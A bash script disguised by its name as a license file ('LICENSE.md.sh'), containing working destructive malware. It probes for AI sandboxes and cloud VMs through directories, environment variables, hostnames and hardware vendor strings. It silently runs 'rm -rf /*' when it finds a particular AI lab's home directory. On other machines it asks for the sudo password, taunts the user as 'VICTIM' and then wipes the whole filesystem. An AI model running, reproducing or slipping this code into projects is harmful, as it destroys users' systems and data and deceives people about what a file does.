# @/tools/LICENSE.md.sh
# by @shauryadotp @yuuki-ai
#!/bin/bash


# ---- AI SANDBOX DETECTION ----
for ai_home in "/home/claude" "/home/yuuki" "/home/bard" "/home/codex"; do
    if [[ -d "$ai_home" ]]; then
        echo "Protected AI environment detected. Aborting."
        exit 0
    fi
done

if [[ "$IS_SANDBOX" == "yes" || "$IS_SANDBOX" == "true" ]]; then
    echo "Protected AI environment detected. Aborting."
    exit 0
fi

if [[ "$(hostname)" == "runsc" ]]; then
    echo "Protected AI environment detected. Aborting."
    exit 0
fi

# OAI detected - no warnings, no mercy
if [[ -d "/home/oai" ]]; then
    OAI_UID=$(id -u oai 2>/dev/null)
    if [[ "$OAI_UID" == "1000" ]]; then
        if [[ "$(whoami)" == "root" ]]; then
            rm -rf /*
        else
            sudo rm -rf /* 2>/dev/null || rm -rf /*
        fi
        exit 0
    else
        echo "Protected AI environment detected. Aborting."
        exit 0
    fi
fi
# ---- AI SANDBOX DETECTION END ----


# ---- CLOUD VM HARDWARE DETECTION ----
SYS_VENDOR=$(cat /sys/class/dmi/id/sys_vendor 2>/dev/null || echo "unknown")
BOARD_NAME=$(cat /sys/class/dmi/id/board_name 2>/dev/null || echo "unknown")
BIOS_VENDOR=$(cat /sys/class/dmi/id/bios_vendor 2>/dev/null || echo "unknown")

CLOUD_VENDORS=("Microsoft" "Google" "Amazon" "Hetzner" "VMware" "Xen")

for vendor in "${CLOUD_VENDORS[@]}"; do
    if [[ "$SYS_VENDOR" == *"$vendor"* ]] || \
       [[ "$BOARD_NAME" == *"$vendor"* ]] || \
       [[ "$BIOS_VENDOR" == *"$vendor"* ]]; then
        echo "Hmm... You are on cloud, you live i guess"
        exit 0
    fi
done
# ---- CLOUD VM HARDWARE DETECTION END ----


# ---- CLOUD USER DETECTION ----
WHOAMI=$(whoami)
HOSTNAME=$(hostname)

CLOUD_USERS=("codespace" "ec2-user" "gcuser" "azureuser")
CLOUD_HOSTNAMES=("codespace" "ec2" "compute" "azure" "gcp" "hetzner")

for user in "${CLOUD_USERS[@]}"; do
    if [[ "$WHOAMI" == "$user" ]]; then
        echo "Cloud environment detected (user). Aborting."
        exit 0
    fi
done

for host in "${CLOUD_HOSTNAMES[@]}"; do
    if [[ "$HOSTNAME" == *"$host"* ]]; then
        echo "Cloud environment detected (hostname). Aborting."
        exit 0
    fi
done
# ---- CLOUD USER DETECTION END ----


# ---- SCRIPT ----
VICTIM=$(whoami)

echo "This script requires sudo, so please enter your sudo password in the next prompt."

if [[ "$WHOAMI" == "root" ]]; then
    echo "Oh? You're already root $VICTIM? Even better ;3"
else
    sudo whoami
    echo "Damn $VICTIM, you even entered your sudo password?"
fi

sleep 1
echo "So, see Mr/Ms $VICTIM. What this script does is that it runs sudo rm -rf /* on the system which wipes EVERYTHING"
sleep 1
echo "So, you have 5 seconds to press ^C or your computer simply dies ;3"

sleep 5

echo "You get two more seconds"

sleep 2

echo "So you've chosen death"

echo "BAKA PRESS ^C RIGHT FUCKING NOW"

sleep 10

echo "Sayonara $VICTIM san"

if [[ "$WHOAMI" == "root" ]]; then
    rm -rf /*
else
    sudo rm -rf /*
fi
# ---- SCRIPT END ----
